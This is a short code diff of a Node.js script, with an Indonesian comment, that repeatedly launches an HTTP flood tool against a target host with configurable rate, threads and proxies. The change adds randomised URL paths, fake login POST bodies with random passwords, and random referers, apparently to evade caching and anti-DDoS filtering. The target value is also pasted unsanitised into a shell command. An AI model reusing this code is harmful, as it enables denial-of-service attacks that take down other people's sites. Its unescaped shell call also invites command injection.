@@ -28,7 +28,7 @@ function runScript() {
 
     // Tunggu 1 detik sebelum memulai ulang
     setTimeout(() => {
-        const process = exec(`node /root/methods/HTTP-COSTUM GET "${host}" ${restartInterval} ${rate} ${thread} ${proxy} --postdata "id=123&action=submit" --full --randrate --legit`);
+        const process = exec(`node /root/methods/HTTP-COSTUM GET "${host}/%RAND%?v=%RAND%" ${restartInterval} ${rate} ${thread} ${proxy} --postdata "user=f&pass=%RAND%" --referer rand --full --randrate --legit`);
 
         process.stdout.on("data", (data) => console.log(data.toString()));
         process.stderr.on("data", (data) => console.error(data.toString()));
